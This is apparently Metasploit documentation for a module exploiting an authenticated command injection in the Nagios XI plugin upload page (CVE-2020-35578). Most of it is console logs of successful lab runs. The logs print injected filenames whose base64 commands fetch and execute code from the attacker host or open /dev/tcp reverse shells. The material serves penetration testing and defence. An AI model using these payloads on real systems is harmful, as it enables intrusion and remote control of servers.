## Vulnerable Application
This module exploits a command injection vulnerability (CVE-2020-35578) in the `/admin/monitoringplugins.php`
page of Nagios XI versions prior to 5.8.0 when uploading plugins. Successful exploitation allows an authenticated
admin user to achieve remote code execution as the `apache` user by uploading a malicious plugin.

The module's `check` method takes advantage of the `Msf::Exploit::Remote::HTTP::NagiosXi` mixin in order to authenticate to the target and
obtain the Nagios XI version number, which is then used to check if the target is Nagios XI prior to 5.8.0 and therefore vulnerable.

Next, the module sends a HTTP POST request to `/admin/monitoringplugins.php` containing a file whose filename is set such that it
will escape the existing command that `/admin/monitoringplugins.php` uses on its backend and will instead cause the server to start
executing the attacker's own commands as the `apache` user.

Once the upload is complete, a new plugin entry will be created along with a corresponding file in `/usr/local/nagios/libexec/`
with the full payload as the file name. Deleting the malicious plugin/file via the web interface was not possible during testing,
so it is automatically deleted when a session spawns.

The module may fail during the first run. If that happens, try running it again with the same settings.

The module supports `linux/x64` and `linux/x86` payloads (target 0) as well as `cmd/unix` payloads (target 1)
and has been successfully tested against Nagios XI versions 5.3.0 and 5.7.5, both running on CentOS 7.
Valid credentials for a Nagios XI admin user are required for exploitation.

Vulnerable software for testing is available [here](https://assets.nagios.com/downloads/nagiosxi/versions.php).
Detailed installation instructions are available
[here](https://assets.nagios.com/downloads/nagiosxi/docs/Installing-Nagios-XI-Manually-on-Linux.pdf)
and an official video tutorial is available [here](https://www.youtube.com/watch?v=fBWA6t6dJ4I).

## Verification Steps
1. Start msfconsole
2. Do: `use exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce`
3. Do: `set RHOSTS [IP]`
4. Do: `set USERNAME [username for the Nagios XI account with administrative privileges]`
5. Do: `set PASSWORD [password for the Nagios XI account with administrative privileges]`
6. Do: `set target [target]`
7. Do: `set payload [payload]`
8. Do: `set LHOST [IP]`
9. Do: `exploit`

## Options
### FINISH_INSTALL
If this is set to `true`, the module will try to finish installing Nagios XI on targets where the installation has not been completed.
This includes signing the license agreement. The default value is `false`.
### PASSWORD
The password for the Nagios XI account to authenticate with.
### TARGETURI
The base path to Nagios XI. The default value is `/nagiosxi/`.
### USERNAME
The username for the Nagios XI account to authenticate with. The default value is `nagiosadmin`.

## Targets
```
Id  Name
--  ----
0   Linux (x86/x64)
1   CMD
```

## Scenarios
### Nagios XI 5.3.0 running on CentOS 7 - Linux target
```
msf6 > use exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set rhosts 192.168.1.16
rhosts => 192.168.1.16
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set lhost 192.168.1.12
lhost => 192.168.1.12
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set password nagiosxi
password => nagiosxi
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FINISH_INSTALL  false            no        If the Nagios XI installation has not been completed, try to do so
                                              . This includes signing the license agreement.
   PASSWORD        nagiosxi         yes       Password to authenticate with
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          192.168.1.16     yes       The target host(s), range CIDR identifier, or hosts file with synt
                                              ax 'file:<path>'
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an
                                              address on the local machine or 0.0.0.0 to listen on all addresses
                                              .
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /nagiosxi/       yes       The base path to the Nagios XI application
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME        nagiosadmin      yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.12     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux (x86/x64)


msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.1.12:4444
[*] Executing automatic check (disable AutoCheck to override)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.3.0
[+] The target appears to be vulnerable.
[*] Using URL: http://0.0.0.0:8080/1V9MerMauwnh8
[*] Local IP: http://192.168.1.12:8080/1V9MerMauwnh8
[*] Client 192.168.1.16 (Wget/1.14 (linux-gnu)) requested /1V9MerMauwnh8
[*] Sending payload to 192.168.1.16 (Wget/1.14 (linux-gnu))
[*] Sending stage (980808 bytes) to 192.168.1.16
[*] Command Stager progress - 100.00% done (120/120 bytes)
[+] Deleted /usr/local/nagios/libexec/;echo d2dldCAtcU8gL3RtcC9hSVN5dVRtZiBodHRwOi8vMTkyLjE2OC45MS4xMjg6ODA4MC8xVjlNZXJNYXV3bmg4O2NobW9kICt4IC90bXAvYUlTeXVUbWY7L3RtcC9hSVN5dVRtZjtybSAtZiAvdG1wL2FJU3l1VG1m | base64 -d | bash;#
[*] Meterpreter session 1 opened (192.168.1.12:4444 -> 192.168.1.16:54012) at 2021-04-01 12:12:35 -0400
[*] Server stopped.

meterpreter > getuid
Server username: apache @ localhost.localdomain (uid=48, gid=48, euid=48, egid=48)
```
### Nagios XI 5.7.5 running on CentOS 7 - CMD target
```
msf6 > use exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set target 1
target => 1
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set rhosts 192.168.1.14
rhosts => 192.168.1.14
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set lhost 192.168.1.12
lhost => 192.168.1.12
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set password nagiosadmin
password => nagiosadmin
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FINISH_INSTALL  false            no        If the Nagios XI installation has not been completed, try to do so
                                              . This includes signing the license agreement.
   PASSWORD        nagiosadmin      yes       Password to authenticate with
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          192.168.1.14     yes       The target host(s), range CIDR identifier, or hosts file with synt
                                              ax 'file:<path>'
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an
                                              address on the local machine or 0.0.0.0 to listen on all addresses
                                              .
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /nagiosxi/       yes       The base path to the Nagios XI application
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME        nagiosadmin      yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.12     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   CMD


msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.1.12:4444
[*] Executing automatic check (disable AutoCheck to override)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.7.5
[+] The target appears to be vulnerable.
[*] Executing the payload
[+] Deleted /usr/local/nagios/libexec/;echo MDwmMTcwLTtleGVjIDE3MDw+L2Rldi90Y3AvMTkyLjE2OC45MS4xMjgvNDQ0NDtzaCA8JjE3MCA+JjE3MCAyPiYxNzA= | base64 -d | bash;#
[*] Command shell session 1 opened (192.168.1.12:4444 -> 192.168.1.14:42834) at 2021-04-01 11:57:38 -0400

id
uid=48(apache) gid=48(apache) groups=48(apache),1000(nagios),1001(nagcmd) context=system_u:system_r:httpd_t:s0
```
### Nagios XI 5.7.5 running on CentOS 7 (unfinished installation) - Linux target
```
msf6 > use exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set rhosts 192.168.1.14
rhosts => 192.168.1.14
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set lhost 192.168.1.12
lhost => 192.168.1.12
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set password nagiosadmin
password => nagiosadmin
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set finish_install true
finish_install => true
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FINISH_INSTALL  true             no        If the Nagios XI installation has not been completed, try to do so
                                              . This includes signing the license agreement.
   PASSWORD        nagiosadmin      yes       Password to authenticate with
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          192.168.1.14     yes       The target host(s), range CIDR identifier, or hosts file with synt
                                              ax 'file:<path>'
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an
                                              address on the local machine or 0.0.0.0 to listen on all addresses
                                              .
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /nagiosxi/       yes       The base path to the Nagios XI application
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME        nagiosadmin      yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.12     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux (x86/x64)


msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.1.12:4444
[*] Executing automatic check (disable AutoCheck to override)
[*] Attempting to authenticate to Nagios XI...
[!] The target seems to be a Nagios XI application that has not been fully installed yet.
[*] Attempting to finish the Nagios XI installation on the target using the provided password. The username will be `nagiosadmin`.
[*] Attempting to authenticate to Nagios XI...
[!] The Nagios XI license agreement has not yet been signed on the target.
[*] Attempting to sign the Nagios XI license agreement...
[*] Attempting to authenticate to Nagios XI...
[!] No response received from the server. This can happen after installing Nagios XI or signing the license agreement
[*] The module will wait for 5 seconds and retry.
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.7.5
[+] The target appears to be vulnerable.
[*] Using URL: http://0.0.0.0:8080/i72tfV
[*] Local IP: http://192.168.1.12:8080/i72tfV
[*] Client 192.168.1.14 (Wget/1.14 (linux-gnu)) requested /i72tfV
[*] Sending payload to 192.168.1.14 (Wget/1.14 (linux-gnu))
[*] Sending stage (980808 bytes) to 192.168.1.14
[*] Command Stager progress - 100.00% done (113/113 bytes)
[+] Deleted /usr/local/nagios/libexec/;echo d2dldCAtcU8gL3RtcC9WWG1ycU5payBodHRwOi8vMTkyLjE2OC45MS4xMjg6ODA4MC9pNzJ0ZlY7Y2htb2QgK3ggL3RtcC9WWG1ycU5pazsvdG1wL1ZYbXJxTmlrO3JtIC1mIC90bXAvVlhtcnFOaWs= | base64 -d | bash;#
[*] Meterpreter session 1 opened (192.168.1.12:4444 -> 192.168.1.14:42790) at 2021-04-01 11:52:51 -0400
[*] Server stopped.

meterpreter > getuid
Server username: apache @ localhost.localdomain (uid=48, gid=48, euid=48, egid=48)
```

### Nagios XI 5.5.6 on Ubuntu 20.04 LTS - Linux Target
```
msf6 > use exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set RHOSTS 172.25.34.240
RHOSTS => 172.25.34.240
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set PASSWORD nagiosadmin
PASSWORD => nagiosadmin
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set LHOST 172.25.33.151
LHOST => 172.25.33.151
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FINISH_INSTALL  false            no        If the Nagios XI installation has not been completed, try to do so. This includes s
                                              igning the license agreement.
   PASSWORD        nagiosadmin      yes       Password to authenticate with
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          172.25.34.240    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the lo
                                              cal machine or 0.0.0.0 to listen on all addresses.
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /nagiosxi/       yes       The base path to the Nagios XI application
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME        nagiosadmin      yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.25.33.151    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux (x86/x64)


msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > exploit

[*] Started reverse TCP handler on 172.25.33.151:4444
[*] Executing automatic check (disable AutoCheck to override)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.5.6
[+] The target appears to be vulnerable.
[*] Using URL: http://0.0.0.0:8080/dDiGLvu7R
[*] Local IP: http://172.25.33.151:8080/dDiGLvu7R
[*] Client 172.25.34.240 (Wget/1.19.4 (linux-gnu)) requested /dDiGLvu7R
[*] Sending payload to 172.25.34.240 (Wget/1.19.4 (linux-gnu))
[*] Sending stage (980808 bytes) to 172.25.34.240
[+] Deleted /usr/local/nagios/libexec/;echo d2dldCAtcU8gL3RtcC9ReVJkU3RzYiBodHRwOi8vMTcyLjI1LjMzLjE1MTo4MDgwL2REaUdMdnU3UjtjaG1vZCAreCAvdG1wL1F5UmRTdHNiOy90bXAvUXlSZFN0c2I7cm0gLWYgL3RtcC9ReVJkU3RzYg== | base64 -d | bash;#
[*] Command Stager progress - 100.00% done (115/115 bytes)
[*] Meterpreter session 1 opened (172.25.33.151:4444 -> 172.25.34.240:60352) at 2021-04-14 16:06:07 -0500
[*] Server stopped.

meterpreter > getuid
Server username: www-data @ test-Virtual-Machine (uid=33, gid=33, euid=33, egid=33)
meterpreter > shell
Process 18247 created.
Channel 1 created.
whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios),1002(nagcmd)
pwd
/usr/local/nagiosxi/html/admin
exit
meterpreter >
```

### Nagios XI 5.5.6 on Ubuntu 20.04 LTS - CMD Target
```
msf6 > use exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set RHOSTS 172.25.34.240
RHOSTS => 172.25.34.240
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set PASSWORD nagiosadmin
PASSWORD => nagiosadmin
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set LHOST 172.25.33.151
LHOST => 172.25.33.151
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > set target CMD
target => CMD
msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FINISH_INSTALL  false            no        If the Nagios XI installation has not been completed, try to do so. This includes s
                                              igning the license agreement.
   PASSWORD        nagiosadmin      yes       Password to authenticate with
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          172.25.34.240    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the lo
                                              cal machine or 0.0.0.0 to listen on all addresses.
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /nagiosxi/       yes       The base path to the Nagios XI application
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME        nagiosadmin      yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.25.33.151    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   CMD


msf6 exploit(linux/http/nagios_xi_plugins_filename_authenticated_rce) > exploit

[*] Started reverse TCP handler on 172.25.33.151:4444
[*] Executing automatic check (disable AutoCheck to override)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.5.6
[+] The target appears to be vulnerable.
[*] Executing the payload
[+] Deleted /usr/local/nagios/libexec/;echo MDwmMTk1LTtleGVjIDE5NTw+L2Rldi90Y3AvMTcyLjI1LjMzLjE1MS80NDQ0O3NoIDwmMTk1ID4mMTk1IDI+JjE5NQ== | base64 -d | bash;#
[*] Command shell session 2 opened (172.25.33.151:4444 -> 172.25.34.240:60358) at 2021-04-14 16:09:22 -0500

whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios),1002(nagcmd)
pwd
/usr/local/nagiosxi/html/admin
```